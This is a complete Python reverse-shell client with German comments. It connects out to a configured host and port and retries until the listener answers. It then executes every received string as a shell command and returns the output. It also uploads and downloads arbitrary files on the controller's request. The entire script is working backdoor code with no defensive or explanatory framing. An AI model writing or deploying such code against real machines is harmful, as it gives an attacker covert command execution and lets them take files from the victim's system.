import socket
import subprocess
import os

HOST = '127.0.0.1'#ip zu der die connection hergestellt werden soll
PORT = 9999

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST,PORT))
        break
    except:
        print("server not online")

def put_recieve():
    pfil = s.recv(256)
    pfilename = str(pfil, "utf8")
    psi = s.recv(256)
    psize = int(str(psi, "utf8"))
    pdata = s.recv(psize)
    pfile = open(str(pfilename), "wb")
    pfile.write(pdata)
    pfile.flush()
    pfile.close()
    po = "put " + pfilename
    s.send(bytes(po, "utf8"))
    
    
def get_send():
    gfil = s.recv(256)
    gfilename = str(gfil, "utf8")
    if os.path.isfile(gfilename):
        gfile = open(gfilename, "rb")
        gsize = os.path.getsize(gfilename)
        gdata = gfile.read()
        s.send(bytes(str(gsize), "utf8"))
        s.send(gdata)
        go = "get " + gfilename
        s.send(bytes(go, "utf8"))
    else: s.send(bytes("error", "utf8"))

def command():
    while True:
        bef = s.recv(1024)
        befehl = str(bef, "utf8")
        if befehl == 'quit':
            s.close()
            break
        elif "put" in befehl: put_recieve()
        elif "get" in befehl: get_send()
        else:
            prozess = subprocess.Popen(befehl, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = prozess.stdout.read() + prozess.stderr.read()
            s.send(bytes(str(output), "utf8"))

command()